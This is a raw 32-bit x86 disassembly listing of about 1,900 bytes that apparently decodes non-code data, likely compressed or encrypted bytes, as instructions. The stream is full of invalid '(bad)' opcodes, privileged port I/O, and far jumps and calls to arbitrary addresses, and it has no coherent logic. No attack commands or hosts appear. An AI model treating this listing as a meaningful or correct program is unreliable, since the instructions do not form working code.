  41a4af:	lods   al,BYTE PTR ds:[esi]
  41a4b0:	lods   eax,DWORD PTR ds:[esi]
  41a4b1:	mov    edx,0xbb3406de
  41a4b6:	outs   dx,BYTE PTR ds:[esi]
  41a4b7:	and    dh,BYTE PTR [edx]
  41a4b9:	mov    ch,0x65
  41a4bb:	add    eax,ecx
  41a4bd:	sti    
  41a4be:	mov    ds:0xd6b34318,al
  41a4c3:	sub    BYTE PTR [ebx-0x6da4ae6c],0x43
  41a4ca:	popa   
  41a4cb:	in     eax,0x7b
  41a4cd:	mov    ds:0xf92473b0,eax
  41a4d2:	cmp    al,0x15
  41a4d4:	sub    al,0xf1
  41a4d6:	fldcw  WORD PTR [esi]
  41a4d8:	and    BYTE PTR [eax+0x5f05c176],bl
  41a4de:	test   BYTE PTR [eax+ebp*4-0x11],ah
  41a4e2:	pusha  
  41a4e3:	mov    WORD PTR [edi+0x4fcaf101],?
  41a4e9:	jmp    0x676d:0x3a583b4d
  41a4f0:	lods   al,BYTE PTR ds:[esi]
  41a4f1:	js     0x41a4f6
  41a4f3:	cld    
  41a4f4:	daa    
  41a4f5:	jno    0x41a50e
  41a4f7:	and    dh,0x9a
  41a4fa:	test   bl,ah
  41a4fc:	aad    0x73
  41a4fe:	jp     0x41a484
  41a500:	fld    st(0)
  41a502:	(bad)  
  41a505:	neg    DWORD PTR [edx+ebx*1]
  41a508:	inc    ecx
  41a509:	icebp  
  41a50a:	dec    eax
  41a50b:	or     DWORD PTR [eax-0xbea16ee],esi
  41a511:	jl     0x41a4c5
  41a513:	mov    ah,0xf1
  41a515:	fcomp  DWORD PTR cs:[edi+0x5cf34712]
  41a51c:	mov    ecx,0xb15da3ca
  41a521:	sbb    edi,DWORD PTR [ecx]
  41a523:	fdivr  st,st(4)
  41a525:	ret    0x8134
  41a528:	push   0x470ac5ee
  41a52d:	mov    esi,0xa8cc1d52
  41a532:	jecxz  0x41a583
  41a534:	pushw  ds
  41a536:	ds push ebp
  41a538:	repz jmp 0x41a5a0
  41a53b:	leave  
  41a53c:	sbb    ecx,ecx
  41a53e:	aaa    
  41a53f:	ror    esi,cl
  41a541:	pop    es
  41a542:	lods   al,BYTE PTR ds:[esi]
  41a543:	or     BYTE PTR [ebp+edi*2-0x2b],bh
  41a547:	sahf   
  41a548:	popa   
  41a549:	mov    ch,0xa3
  41a54b:	adc    eax,0x3385f753
  41a550:	repz and eax,0xa8248913
  41a556:	enter  0x737f,0x3d
  41a55a:	add    eax,0x4c5d426f
  41a55f:	adc    DWORD PTR [eax-0x51e13ad0],esp
  41a565:	jnp    0x41a587
  41a567:	gs out 0xf2,al
  41a56a:	pushf  
  41a56b:	iret   
  41a56c:	xchg   ebp,eax
  41a56d:	pop    edx
  41a56e:	jbe    0x41a59f
  41a570:	ror    DWORD PTR [ebp+0x3d826ecd],0x5
  41a577:	inc    ecx
  41a578:	jbe    0x41a528
  41a57a:	rcr    DWORD PTR [ebx+0x6c],0x3e
  41a57e:	dec    esi
  41a57f:	adc    edi,ebx
  41a581:	push   esp
  41a582:	pusha  
  41a583:	jecxz  0x41a5b5
  41a585:	test   eax,0xede57c52
  41a58a:	mov    edx,DWORD PTR [ebx+0x5c682381]
  41a590:	xlat   BYTE PTR ds:[ebx]
  41a591:	ins    BYTE PTR es:[edi],dx
  41a592:	jecxz  0x41a538
  41a594:	clc    
  41a595:	adc    cl,BYTE PTR [edi-0x73398a33]
  41a59b:	in     eax,dx
  41a59c:	mov    BYTE PTR [esi],bl
  41a59e:	bound  edi,QWORD PTR [esi]
  41a5a0:	in     eax,dx
  41a5a1:	lods   al,BYTE PTR ds:[esi]
  41a5a2:	jecxz  0x41a605
  41a5a4:	add    DWORD PTR [ebp-0x14],ecx
  41a5a7:	sbb    eax,0x69959eeb
  41a5ac:	rcr    DWORD PTR [esi+0x43],1
  41a5af:	mov    ebp,DWORD PTR [esi-0x24]
  41a5b2:	out    0x44,eax
  41a5b4:	dec    esi
  41a5b5:	ss sbb eax,0x887644d6
  41a5bb:	clc    
  41a5bc:	jp     0x41a5c3
  41a5be:	fdivr  DWORD PTR gs:[edx]
  41a5c1:	imul   eax,DWORD PTR [ecx+0x25],0xffffffe8
  41a5c5:	xchg   ebp,eax
  41a5c6:	shr    DWORD PTR [eax],1
  41a5c8:	fsub   st,st(7)
  41a5ca:	popa   
  41a5cb:	sub    al,0x8c
  41a5cd:	aam    0xbf
  41a5cf:	jecxz  0x41a5aa
  41a5d1:	out    0xde,al
  41a5d3:	stos   BYTE PTR es:[edi],al
  41a5d4:	mov    ds:0xd2efec4,al
  41a5d9:	jecxz  0x41a5a2
  41a5db:	dec    eax
  41a5dc:	pop    ss
  41a5dd:	cmp    esp,DWORD PTR ds:0x98396693
  41a5e3:	mov    esi,0x251f769d
  41a5e8:	jmp    0xd4a9:0x5e98f6f5
  41a5ef:	test   DWORD PTR [esi],esi
  41a5f1:	icebp  
  41a5f2:	sub    BYTE PTR [ecx-0x4],al
  41a5f5:	js     0x41a5e0
  41a5f7:	cmp    DWORD PTR [ecx],0xa5ea4391
  41a5fd:	dec    edx
  41a5fe:	and    eax,DWORD PTR [esi+0x40]
  41a601:	sti    
  41a602:	test   BYTE PTR [eax-0x21],bl
  41a605:	ins    DWORD PTR es:[edi],dx
  41a606:	scas   eax,DWORD PTR es:[edi]
  41a607:	dec    ebp
  41a608:	popa   
  41a609:	shl    DWORD PTR [ebp+ebp*4-0x76],0xd3
  41a60e:	push   cs
  41a60f:	cwde   
  41a610:	mov    edx,DWORD PTR [esi]
  41a612:	imul   edx,DWORD PTR [ebx],0xe1098e43
  41a618:	imul   edi,edi,0x42
  41a61b:	push   eax
  41a61c:	mov    ch,0x4c
  41a61f:	in     al,0xa
  41a621:	and    BYTE PTR [esi+edi*4-0x1a],bl
  41a625:	mov    ebx,eax
  41a627:	xchg   BYTE PTR [esi-0x34656a5f],bh
  41a62d:	sub    eax,0xebe47fcc
  41a632:	xlat   BYTE PTR ds:[ebx]
  41a633:	or     eax,0x31f268e2
  41a638:	ins    DWORD PTR es:[edi],dx
  41a639:	ret    
  41a63a:	dec    ecx
  41a63b:	push   ebp
  41a63c:	xor    eax,0x99eaabbd
  41a641:	pop    esp
  41a642:	cdq    
  41a643:	adc    dl,BYTE PTR [edx+0x2a]
  41a646:	and    BYTE PTR [ebx+0x7a4024c8],ah
  41a64c:	loope  0x41a664
  41a64e:	push   es
  41a64f:	xchg   edi,eax
  41a650:	xchg   DWORD PTR [edi-0x7589c9c2],edi
  41a656:	scas   eax,DWORD PTR es:[edi]
  41a657:	or     al,0xf8
  41a659:	ja     0x41a60f
  41a65b:	sub    ch,BYTE PTR [edi]
  41a65d:	or     eax,0x959d6292
  41a662:	stos   DWORD PTR es:[edi],eax
  41a663:	pop    bp
  41a665:	lds    ecx,FWORD PTR es:[esi+esi*4-0x80]
  41a66a:	scas   eax,DWORD PTR es:[di]
  41a66c:	push   0xe8607f14
  41a671:	xchg   edi,eax
  41a672:	jns    0x41a636
  41a674:	mov    BYTE PTR [ebp-0x4d],bh
  41a677:	cmp    BYTE PTR [edi+0x64],dl
  41a67a:	sbb    bh,BYTE PTR [ecx-0x6]
  41a67d:	push   0x3adfea09
  41a682:	aad    0x87
  41a684:	(bad)  
  41a685:	loope  0x41a61c
  41a687:	inc    edx
  41a688:	or     ah,0xee
  41a68b:	stc    
  41a68c:	not    DWORD PTR [ebp-0x68]
  41a68f:	pop    ebp
  41a690:	inc    eax
  41a691:	ret    0x9824
  41a694:	xchg   edi,eax
  41a695:	adc    esp,DWORD PTR [edx-0x29]
  41a698:	(bad)  
  41a699:	adc    BYTE PTR [eax-0x24],dl
  41a69c:	push   edi
  41a69d:	fmul   DWORD PTR [esi+0x0]
  41a6a0:	gs pushf 
  41a6a2:	std    
  41a6a3:	dec    esp
  41a6a4:	adc    ecx,DWORD PTR [esp+edx*4-0x41f31797]
  41a6ab:	push   ds
  41a6ac:	cmp    al,0x5d
  41a6ae:	in     eax,dx
  41a6af:	push   ecx
  41a6b0:	nop
  41a6b1:	add    bh,BYTE PTR [esi+ecx*1+0x7d]
  41a6b5:	hlt    
  41a6b6:	arpl   WORD PTR [esi],bp
  41a6b8:	daa    
  41a6b9:	mov    ecx,0xe890a898
  41a6be:	xor    DWORD PTR [ecx+0x31],esi
  41a6c1:	pop    edi
  41a6c2:	and    eax,DWORD PTR [ebx]
  41a6c4:	icebp  
  41a6c5:	jbe    0x41a6ff
  41a6c7:	sub    edx,ecx
  41a6c9:	dec    DWORD PTR [ebx]
  41a6cb:	(bad)  
  41a6cc:	push   ds
  41a6cd:	xchg   esi,eax
  41a6ce:	push   ss
  41a6cf:	mov    esi,0x38595fe5
  41a6d4:	pop    esp
  41a6d5:	sbb    eax,0xb87cf3a8
  41a6da:	in     eax,0xc5
  41a6dc:	pop    ebx
  41a6dd:	stos   DWORD PTR es:[edi],eax
  41a6de:	adc    ah,BYTE PTR [ebp-0x4e24427b]
  41a6e4:	popf   
  41a6e5:	xchg   ecx,eax
  41a6e6:	imul   ecx,DWORD PTR [edi],0x3c99ccd0
  41a6ec:	push   eax
  41a6ed:	add    BYTE PTR [esi-0x35],0xe6
  41a6f1:	add    eax,0x8ac67cf2
  41a6f6:	out    0x49,eax
  41a6f8:	(bad)  
  41a6f9:	in     al,0xb2
  41a6fb:	shl    esi,0xec
  41a6fe:	cwde   
  41a6ff:	add    ebp,0x19
  41a702:	jmp    DWORD PTR [ebp-0x4a8b5abb]
  41a708:	mov    dh,0x15
  41a70a:	cmp    BYTE PTR [ecx+0x29],cl
  41a70d:	fcmovb st,st(5)
  41a70f:	jg     0x41a692
  41a711:	test   ecx,edx
  41a713:	jmp    0x41a768
  41a715:	in     eax,dx
  41a716:	(bad)  
  41a717:	adc    DWORD PTR [edi+ebx*4-0x1c5e4139],esi
  41a71e:	scas   al,BYTE PTR es:[edi]
  41a71f:	pop    esi
  41a720:	inc    eax
  41a721:	cld    
  41a722:	add    BYTE PTR [ebp+0x7f2d280d],dh
  41a728:	sub    eax,0x2155e99c
  41a72d:	mov    esp,eax
  41a72f:	push   ebp
  41a730:	and    eax,DWORD PTR [eax-0x1c]
  41a733:	cwde   
  41a734:	jp     0x41a6d4
  41a736:	ins    DWORD PTR es:[edi],dx
  41a737:	jb     0x41a73d
  41a739:	jnp    0x41a6fb
  41a73b:	scas   al,BYTE PTR es:[edi]
  41a73c:	loope  0x41a7a4
  41a73e:	pusha  
  41a73f:	daa    
  41a740:	hlt    
  41a741:	cmp    esi,esi
  41a743:	adc    edx,eax
  41a745:	mov    ch,0x61
  41a747:	jae    0x41a6e5
  41a749:	jb     0x41a728
  41a74b:	sbb    esp,DWORD PTR ds:[ebp-0x70]
  41a74f:	cmp    BYTE PTR [eax],al
  41a751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a752:	cs retf 0xfc19
  41a756:	imul   ebp,DWORD PTR ds:0x1c3f654f,0xffffffac
  41a75d:	outs   dx,BYTE PTR ds:[esi]
  41a75e:	test   BYTE PTR [ebx],al
  41a760:	jns    0x41a7ae
  41a762:	mov    DWORD PTR [edx],esi
  41a764:	inc    edx
  41a765:	dec    esi
  41a766:	sti    
  41a767:	dec    edi
  41a768:	pop    es
  41a769:	sub    cl,bl
  41a76b:	mov    ebp,0x13e75282
  41a770:	test   BYTE PTR [ebp+0x30],al
  41a773:	jbe    0x41a76e
  41a775:	call   0xaefd:0xe64ddda4
  41a77c:	cdq    
  41a77d:	mov    dl,0xfc
  41a77f:	aas    
  41a780:	data16 sbb ah,BYTE PTR [ebp+esi*2-0x31]
  41a785:	or     eax,0x327416e2
  41a78a:	sbb    edx,DWORD PTR [ebp-0x4]
  41a78d:	and    DWORD PTR [ecx+eiz*8-0x41],0x34f5a443
  41a795:	add    eax,0x8c670f7b
  41a79a:	pop    esi
  41a79b:	dec    edx
  41a79c:	jnp    0x41a760
  41a79e:	add    ch,al
  41a7a0:	lock cdq 
  41a7a2:	adc    eax,0xdbe47750
  41a7a7:	sbb    edi,DWORD PTR [esp]
  41a7aa:	int3   
  41a7ab:	(bad)  
  41a7ac:	and    DWORD PTR [ebp-0x5],esp
  41a7af:	call   0xea54baac
  41a7b4:	mov    cl,0x26
  41a7b6:	hlt    
  41a7b7:	nop
  41a7b8:	cwde   
  41a7b9:	mov    al,0xd6
  41a7bb:	pop    ds
  41a7bc:	xor    bh,bh
  41a7be:	inc    ebp
  41a7bf:	das    
  41a7c0:	call   0x34b0:0xf9bf8d0
  41a7c7:	jmp    0xd2d80f6f
  41a7cc:	das    
  41a7cd:	imul   esi,DWORD PTR [eax-0x5d7a1cc7],0x62
  41a7d4:	(bad)  
  41a7d5:	mov    ecx,0x6689305f
  41a7da:	xchg   ebp,eax
  41a7db:	rcr    DWORD PTR [edi-0x7f],0x1b
  41a7df:	lahf   
  41a7e0:	fdivr  QWORD PTR [esi-0x2]
  41a7e3:	(bad)  
  41a7e4:	mov    eax,ds:0x4123c026
  41a7e9:	xor    al,BYTE PTR [esi-0x54]
  41a7ec:	cmc    
  41a7ed:	pop    ecx
  41a7ee:	std    
  41a7ef:	fmul   DWORD PTR [esi+0x0]
  41a7f2:	cld    
  41a7f3:	(bad)  
  41a7f4:	jne    0x41a7b3
  41a7f6:	xor    BYTE PTR [eax-0x50],0x71
  41a7fa:	outs   dx,BYTE PTR ds:[esi]
  41a7fb:	cmp    ebp,eax
  41a7fd:	sbb    ecx,DWORD PTR [edx]
  41a7ff:	mov    DWORD PTR [ecx+0x63],esp
  41a802:	out    dx,eax
  41a803:	xlat   BYTE PTR ds:[ebx]
  41a804:	jg     0x41a7f5
  41a806:	sbb    eax,ebx
  41a808:	test   al,0xcc
  41a80a:	call   0x323a:0xd50ca250
  41a811:	dec    edx
  41a812:	adc    al,0xd4
  41a814:	xor    eax,0xfa6e8328
  41a819:	jbe    0x41a83e
  41a81b:	or     al,0x38
  41a81d:	out    dx,eax
  41a81e:	call   0x226b:0xd495918d
  41a825:	inc    ecx
  41a826:	adc    eax,0xa6e64125
  41a82b:	std    
  41a82c:	loope  0x41a87f
  41a82e:	mov    edx,0x8345d126
  41a833:	inc    edx
  41a834:	fs push ebx
  41a836:	fiadd  WORD PTR [ebx]
  41a838:	or     dl,BYTE PTR [eax+0x3cf41b1a]
  41a83e:	xchg   BYTE PTR [ebx+ebx*1],cl
  41a841:	imul   ebp,DWORD PTR [edx+edx*1],0xfffffff7
  41a845:	imul   edi,DWORD PTR [esp+ebp*4-0x19aa1bfe],0x2b
  41a84d:	fs ins DWORD PTR es:[edi],dx
  41a84f:	test   DWORD PTR [ebx+0x19],ebp
  41a852:	or     bl,BYTE PTR cs:[ebx+0x56]
  41a856:	mov    ecx,0x5e39e45d
  41a85b:	lea    ebp,ds:0x79c5bc4d
  41a861:	in     eax,dx
  41a862:	bound  edi,QWORD PTR [eax]
  41a864:	arpl   WORD PTR [ebx+0x7e095646],si
  41a86a:	sbb    DWORD PTR [edi+0x6e1939e4],ebx
  41a870:	arpl   WORD PTR [esi],dx
  41a872:	sbb    al,0x94
  41a874:	xchg   esi,eax
  41a875:	adc    DWORD PTR [edi-0x64635c6b],0xfe6c32b9
  41a87f:	not    DWORD PTR [eax]
  41a881:	add    DWORD PTR [edi+0x5a],ecx
  41a884:	rcl    esi,cl
  41a886:	into   
  41a887:	jb     0x41a8ee
  41a889:	retf   
  41a88a:	inc    edi
  41a88b:	and    eax,0x1d44efad
  41a890:	adc    eax,0xddd31326
  41a895:	icebp  
  41a896:	mov    eax,ds:0xab546bd5
  41a89b:	jg     0x41a8dd
  41a89d:	idiv   BYTE PTR [ecx-0x17]
  41a8a0:	jb     0x41a827
  41a8a2:	dec    ebx
  41a8a3:	loopne 0x41a8e0
  41a8a5:	lock ins DWORD PTR es:[edi],dx
  41a8a7:	fcomi  st,st(6)
  41a8a9:	mov    esp,0x8f18f98e
  41a8ae:	mov    ds:0xd8b5a45f,al
  41a8b3:	ss push ebp
  41a8b5:	icebp  
  41a8b6:	sub    al,0x79
  41a8b8:	jp     0x41a937
  41a8ba:	in     eax,dx
  41a8bb:	cmp    BYTE PTR [ebx+eiz*4+0x51],bl
  41a8bf:	mul    DWORD PTR [ecx-0x53]
  41a8c2:	leave  
  41a8c3:	(bad)  
  41a8c6:	add    edx,eax
  41a8c8:	(bad)  
  41a8ca:	lds    ebx,FWORD PTR [esi]
  41a8cc:	das    
  41a8cd:	sahf   
  41a8ce:	fimul  WORD PTR [esi]
  41a8d0:	sbb    esp,DWORD PTR [esi-0x51]
  41a8d3:	pop    ebp
  41a8d4:	jecxz  0x41a952
  41a8d6:	jns    0x41a87c
  41a8d8:	xor    bl,BYTE PTR [eax-0x20]
  41a8db:	sbb    esp,DWORD PTR [edi-0x3f]
  41a8de:	out    0x1a,al
  41a8e0:	xor    al,0x3f
  41a8e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8e3:	inc    esp
  41a8e4:	inc    eax
  41a8e5:	lea    ebx,ds:0xcd72c822
  41a8eb:	lods   al,BYTE PTR ds:[esi]
  41a8ec:	jge    0x41a90d
  41a8ee:	inc    edi
  41a8ef:	int    0x44
  41a8f1:	pop    ecx
  41a8f2:	add    eax,ecx
  41a8f4:	hlt    
  41a8f5:	outs   dx,DWORD PTR ds:[esi]
  41a8f6:	mov    al,0x93
  41a8f8:	das    
  41a8f9:	sbb    edi,esp
  41a8fb:	xor    DWORD PTR [ebp+0x2ee46f9c],ebx
  41a901:	push   eax
  41a902:	into   
  41a903:	mov    dl,0x38
  41a905:	mov    eax,ds:0xf423017c
  41a90a:	icebp  
  41a90b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a90c:	adc    DWORD PTR [ebx-0x74],edi
  41a90f:	sti    
  41a910:	(bad)  
  41a911:	sahf   
  41a912:	mov    eax,0xa0272dee
  41a917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a918:	mov    dl,BYTE PTR [ebp+0x3da0e93f]
  41a91e:	cwde   
  41a91f:	xor    al,0xee
  41a921:	or     al,cl
  41a923:	in     eax,0xf5
  41a925:	js     0x41a96a
  41a927:	mov    esp,0xeabfdffa
  41a92c:	loop   0x41a98d
  41a92e:	(bad)
  41a933:	sti    
  41a934:	fst    DWORD PTR [esi+0x4b]
  41a937:	daa    
  41a938:	out    0x28,eax
  41a93a:	xchg   cl,ah
  41a93c:	imul   edi,esp,0xb3edde61
  41a942:	leave  
  41a943:	les    edx,FWORD PTR [ecx-0x39953b23]
  41a949:	jl     0x41a8f8
  41a94b:	cmp    eax,0x9b29380
  41a950:	(bad)  [edx+0x2f]
  41a953:	idiv   BYTE PTR [esi+eiz*8]
  41a956:	out    0x8f,al
  41a958:	sub    eax,DWORD PTR [esi-0x61]
  41a95b:	pop    ecx
  41a95c:	gs aam 0x36
  41a95f:	inc    ecx
  41a960:	scas   eax,DWORD PTR es:[edi]
  41a961:	or     eax,edx
  41a963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a964:	sbb    eax,0xd1710ab3
  41a969:	cmp    BYTE PTR [eax+0x26],cl
  41a96c:	push   edi
  41a96d:	jl     0x41a91a
  41a96f:	mov    bl,0x59
  41a971:	inc    ecx
  41a972:	adc    BYTE PTR [edx+0x3d],cl
  41a975:	xchg   edx,eax
  41a976:	dec    ecx
  41a977:	add    eax,ebx
  41a979:	push   ecx
  41a97a:	cmc    
  41a97b:	ins    BYTE PTR es:[edi],dx
  41a97c:	add    ch,bh
  41a97e:	mov    bh,0xd9
  41a980:	clc    
  41a981:	leave  
  41a982:	dec    ecx
  41a983:	retf   0x2735
  41a986:	sub    cl,bl
  41a988:	int3   
  41a989:	mov    eax,ds:0xa7583d6c
  41a98e:	sub    ecx,DWORD PTR [edx-0x7f]
  41a991:	popf   
  41a992:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a993:	cld    
  41a994:	shl    BYTE PTR [esi+0x5c],cl
  41a997:	mov    al,ds:0x679329df
  41a99c:	les    edi,FWORD PTR [edi-0x403f5608]
  41a9a2:	jb     0x41a985
  41a9a4:	and    cl,dh
  41a9a6:	push   edi
  41a9a7:	xchg   edi,eax
  41a9a8:	rol    DWORD PTR [ebx-0x5],0x96
  41a9ac:	mov    ebx,0xb456c715
  41a9b1:	and    edx,DWORD PTR [ecx-0x17]
  41a9b4:	mov    ah,0xdd
  41a9b6:	test   bl,ch
  41a9b8:	and    BYTE PTR [edx+0x74],al
  41a9bb:	pop    ebp
  41a9bc:	std    
  41a9bd:	outs   dx,DWORD PTR ds:[esi]
  41a9be:	jle    0x41a976
  41a9c0:	mov    ds:0x5842d6ac,al
  41a9c5:	idiv   BYTE PTR [esi-0x7dc49e48]
  41a9cb:	clc    
  41a9cc:	imul   eax,DWORD PTR [eax],0xb6321e66
  41a9d2:	sar    BYTE PTR [edx],1
  41a9d4:	mov    ds:0x1c5dded,al
  41a9d9:	push   esi
  41a9da:	and    DWORD PTR ds:0x5a74bc49,eax
  41a9e0:	inc    edx
  41a9e1:	imul   edi,edi,0x48
  41a9e4:	jp     0x41aa21
  41a9e6:	and    eax,0x7c4f86b9
  41a9eb:	ss push ecx
  41a9ed:	(bad)  
  41a9ef:	pushf  
  41a9f0:	test   DWORD PTR [eax],ebx
  41a9f2:	xchg   edi,eax
  41a9f3:	inc    edi
  41a9f4:	(bad)  
  41a9f5:	(bad)  
  41a9f6:	jmp    0xe7ad:0x44386fc0
  41a9fd:	pop    edi
  41a9fe:	xchg   DWORD PTR [ebx-0x1b],ecx
  41aa01:	mov    gs,WORD PTR [ebp-0x71bd1b70]
  41aa07:	mov    al,0xf5
  41aa09:	sti    
  41aa0a:	lea    esi,[eax-0x2648ed1f]
  41aa10:	out    dx,eax
  41aa11:	add    DWORD PTR gs:[ebp-0x38],0x2752242b
  41aa19:	fst    QWORD PTR [esi]
  41aa1b:	retf   0xb588
  41aa1e:	mov    eax,ds:0x6b1c9a6b
  41aa23:	xor    eax,0xbd9b0926
  41aa28:	and    al,0xb9
  41aa2a:	cmp    eax,0x93d4d701
  41aa2f:	mov    ds:0xd9db43ea,al
  41aa34:	pop    eax
  41aa35:	mov    ebx,0xd0705e63
  41aa3a:	jmp    0x41aa1f
  41aa3c:	xchg   edx,eax
  41aa3d:	stc    
  41aa3e:	jecxz  0x41aa83
  41aa40:	inc    edx
  41aa41:	dec    eax
  41aa42:	jno    0x41aa0c
  41aa44:	jnp    0x41aa18
  41aa46:	fs imul edx,DWORD PTR ds:0x512e6ce4,0x4ee94a4e
  41aa52:	out    0x1f,al
  41aa54:	xchg   esi,eax
  41aa55:	mov    ch,0x57
  41aa57:	aam    0x1b
  41aa59:	and    eax,0xd9abf36a
  41aa5e:	clc    
  41aa5f:	icebp  
  41aa60:	inc    ecx
  41aa61:	mov    ds:0xae398219,al
  41aa66:	or     eax,0xec60030a
  41aa6b:	jb     0x41a9f7
  41aa6d:	mov    ch,0x58
  41aa6f:	ret    0x2db0
  41aa72:	out    0xbb,eax
  41aa74:	push   0x74
  41aa76:	pushf  
  41aa77:	inc    ecx
  41aa78:	jmp    0x39f4677e
  41aa7d:	pop    edi
  41aa7e:	dec    ebp
  41aa7f:	fidiv  WORD PTR [edi-0x7f6a56dc]
  41aa85:	sti    
  41aa86:	jbe    0x41aa4a
  41aa88:	sub    dh,bl
  41aa8a:	aas    
  41aa8b:	jns    0x41ab04
  41aa8d:	mov    cl,0xf2
  41aa8f:	pop    ebx
  41aa90:	sub    al,0xd2
  41aa92:	xor    BYTE PTR [esi+0x6413dc6c],dl
  41aa98:	into   
  41aa99:	popa   
  41aa9a:	in     al,0x69
  41aa9c:	test   al,0x1f
  41aa9e:	mov    edi,0x3854e7d0
  41aaa3:	ins    DWORD PTR es:[edi],dx
  41aaa4:	pop    ebx
  41aaa5:	jns    0x41aaa5
  41aaa7:	cmovle esp,esp
  41aaaa:	add    BYTE PTR [edi+0x63],ch
  41aaad:	arpl   WORD PTR [esi+ebp*1-0x4e],sp
  41aab1:	les    esi,FWORD PTR [edi-0x3d]
  41aab4:	jmp    0x9faf2bb6
  41aab9:	add    ch,dl
  41aabb:	arpl   WORD PTR [ebx+esi*8],dx
  41aabe:	push   ds
  41aabf:	ret    
  41aac0:	pop    ebx
  41aac1:	jno    0x41aae8
  41aac3:	xor    eax,0xa495cc63
  41aac8:	je     0x41aac6
  41aaca:	pop    DWORD PTR [ebx-0x48f43f7c]
  41aad0:	sbb    bl,BYTE PTR [eax]
  41aad2:	pop    ecx
  41aad3:	jecxz  0x41aadd
  41aad5:	pop    ebp
  41aad6:	mov    ds:0x815f85c4,al
  41aadb:	(bad)  
  41aadc:	mov    ds:0xd3966471,eax
  41aae1:	repnz daa 
  41aae3:	mov    WORD PTR [esi],gs
  41aae5:	mov    dh,0x4f
  41aae7:	dec    ecx
  41aae8:	das    
  41aae9:	cs sbb al,0x4e
  41aaec:	stos   BYTE PTR es:[edi],al
  41aaed:	xchg   BYTE PTR [esi+edx*1+0x60],cl
  41aaf1:	sti    
  41aaf2:	pop    ds
  41aaf3:	add    ch,ah
  41aaf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaf6:	mov    eax,0x2d9908fb
  41aafb:	mov    esi,0x1e7f2db4
  41ab00:	daa    
  41ab01:	mov    DWORD PTR [edi],eax
  41ab03:	sahf   
  41ab04:	xlat   BYTE PTR ds:[ebx]
  41ab05:	mov    DWORD PTR [ecx+0x60],edi
  41ab08:	in     eax,dx
  41ab09:	inc    esi
  41ab0a:	adc    BYTE PTR [ecx],bl
  41ab0c:	push   ss
  41ab0d:	or     eax,0xc0e59c1e
  41ab12:	mov    ecx,DWORD PTR [edx+eiz*4]
  41ab15:	in     al,0x25
  41ab17:	xor    DWORD PTR [esi-0x32],esp
  41ab1a:	stc    
  41ab1b:	lods   al,BYTE PTR ds:[esi]
  41ab1c:	or     ebp,DWORD PTR [edx+0x5]
  41ab1f:	sub    al,0x74
  41ab21:	lock and DWORD PTR [ebp+0x3],edi
  41ab25:	jne    0x41ab29
  41ab27:	xchg   ecx,eax
  41ab28:	jp     0x41ab9b
  41ab2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab2b:	shl    BYTE PTR [esp+eiz*2+0x5da65f5],1
  41ab32:	dec    ebp
  41ab33:	sub    edx,DWORD PTR [eax]
  41ab35:	repz test DWORD PTR [edx-0x601025cd],esp
  41ab3c:	mov    ?,WORD PTR es:[esp+ebp*1+0x4d]
  41ab41:	mov    bh,0xbc
  41ab43:	shr    DWORD PTR [ecx],1
  41ab45:	xchg   ecx,eax
  41ab46:	js     0x41aaef
  41ab48:	das    
  41ab49:	pushf  
  41ab4a:	sub    eax,0xb9faa9c7
  41ab4f:	js     0x41aba7
  41ab51:	retf   
  41ab52:	adc    eax,DWORD PTR [ebx+eiz*2]
  41ab55:	sbb    al,0x6e
  41ab57:	fimul  DWORD PTR [ebp+0x39]
  41ab5a:	or     edi,DWORD PTR [esi+0x62]
  41ab5d:	ins    DWORD PTR es:[edi],dx
  41ab5e:	sub    eax,esp
  41ab60:	loopne 0x41abb3
  41ab62:	mov    bh,0x17
  41ab64:	dec    ebp
  41ab65:	imul   ebx,DWORD PTR [eax+0x7426990a],0xe23c8bce
  41ab6f:	jg     0x41ab85
  41ab71:	hlt    
  41ab72:	stos   BYTE PTR es:[edi],al
  41ab73:	add    al,0xe9
  41ab75:	push   esp
  41ab76:	pop    edi
  41ab77:	sub    esi,DWORD PTR [ebx]
  41ab79:	int3   
  41ab7a:	in     eax,0xfc
  41ab7c:	call   0xaaa85b14
  41ab81:	lods   eax,DWORD PTR ds:[esi]
  41ab82:	jae    0x41abee
  41ab84:	mov    al,ds:0x16d271d
  41ab89:	cwde   
  41ab8a:	fidivr DWORD PTR [ebp+ebp*8+0x779bf2e4]
  41ab91:	inc    eax
  41ab92:	cdq    
  41ab93:	cli    
  41ab94:	xchg   edi,eax
  41ab95:	dec    edx
  41ab96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab97:	jmp    FWORD PTR [edx-0x4ef6cf69]
  41ab9d:	add    eax,0xf2b54979
  41aba2:	add    eax,0x3b07b1d8
  41aba7:	mov    DWORD PTR [esi-0x4b],ebp
  41abaa:	jns    0x41ac19
  41abac:	jmp    0x41ab53
  41abae:	arpl   WORD PTR [eax-0x2e3d691a],bx
  41abb4:	outs   dx,BYTE PTR ds:[si]
  41abb6:	addr16 mov ebx,0xa0008d54
  41abbc:	lahf   
  41abbd:	cmp    al,0x2d
  41abbf:	aaa    
  41abc0:	bound  esi,QWORD PTR [ebx-0x21c5ccdd]
  41abc6:	lods   al,BYTE PTR ds:[esi]
  41abc7:	test   BYTE PTR [bx+di-0xe2f],ah
  41abcc:	test   al,0xf6
  41abce:	cmp    al,0xe1
  41abd0:	fs test eax,0x27247bb4
  41abd6:	sar    DWORD PTR [ecx+0x56],1
  41abd9:	xor    ebp,esp
  41abdb:	mov    eax,ds:0x1297cbc2
  41abe0:	(bad)  
  41abe2:	mov    ds:0xe7292476,eax
  41abe7:	jns    0x41ab75
  41abe9:	sub    al,0xce
  41abeb:	ins    DWORD PTR es:[edi],dx
  41abec:	add    eax,0x35d0fe87
  41abf1:	retf   0x7aba
  41abf4:	in     al,dx
  41abf5:	aam    0x99
  41abf7:	inc    eax
  41abf8:	xchg   edx,eax
  41abf9:	(bad)
  41abfd:	xchg   edi,eax
  41abfe:	xor    ecx,DWORD PTR [ebx]
  41ac00:	shr    BYTE PTR [edi-0x2aafaa21],cl
  41ac06:	push   ss
  41ac07:	mov    dl,BYTE PTR [esi+0x7a50f9c4]
  41ac0d:	mov    bh,0x93
